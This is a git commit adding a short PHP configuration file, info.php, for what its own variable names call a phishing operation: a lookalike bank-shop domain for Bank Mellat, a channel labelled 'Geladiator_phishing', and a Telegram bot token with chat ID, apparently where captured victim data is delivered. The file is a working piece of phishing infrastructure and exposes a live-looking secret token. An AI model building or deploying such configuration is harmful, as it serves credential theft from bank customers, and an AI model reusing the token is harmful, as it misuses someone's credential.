67af14a78d8b873bd66c48149d6f8494bb1121d7
TRSONGIR <67713900+TRSONGIR@users.noreply.github.com>
2020-09-14 16:52:50 +0430

    master

---
+++ info.php
@@ -0,0 +1,15 @@
+<?php
+
+ 
+$link= "https://bank-mellat-shop.ga";
+
+$chanel= "Geladiator_phishing";
+
+$name = "Geladiator" ;
+
+
+$TOKENM = "1237690521:AAFVWN_LSL6J44g9xpEpzE2VEjTtLZ7V9cE";
+
+$IDM = -389276288;
+
+?>
